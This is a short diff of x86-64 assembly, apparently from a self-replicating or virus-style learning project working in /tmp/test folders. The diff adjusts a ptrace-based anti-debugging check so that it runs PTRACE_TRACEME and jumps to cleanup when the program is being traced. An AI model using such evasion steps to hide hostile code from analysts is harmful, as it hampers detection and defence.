@@ -74,10 +74,13 @@ _start:
 	sub rsp, 5000											   ; reserving 5000 bytes
 	mov r15, rsp  
 	mov byte [r15 + 550], 0										; 0 for /tmp/test, 1 for /tmp/test2
+
 	mov rax, SYS_PTRACE											; anti-debugging
+	xor rdi, rdi
 	syscall
 	cmp rax, 0
-	jl _end
+	jl cleanup
+
 	call set_folder_chdir
 	chdir:
 		pop rdi
